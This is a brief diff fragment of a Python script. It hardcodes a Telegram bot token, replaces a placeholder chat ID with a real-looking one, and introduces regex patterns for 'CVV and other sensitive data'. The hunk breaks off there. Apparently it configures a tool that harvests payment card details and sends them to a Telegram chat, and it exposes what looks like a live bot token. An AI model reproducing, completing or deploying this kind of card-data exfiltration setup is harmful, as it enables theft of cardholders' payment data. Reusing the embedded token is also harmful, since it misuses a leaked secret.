@@ -7,7 +7,7 @@ import requests
 
 # Telegram bot token and chat ID
 TELEGRAM_BOT_TOKEN = "7303019941:AAHAzi3lU1R6IU6k8L7ERqM3XPbCwbkDOxY"
-TELEGRAM_CHAT_ID = "<Your_Telegram_Chat_ID>"
+TELEGRAM_CHAT_ID = "6460703454"
 
 # Precompiled regex patterns for CVV and other sensitive data
 REGEX_PATTERNS = [
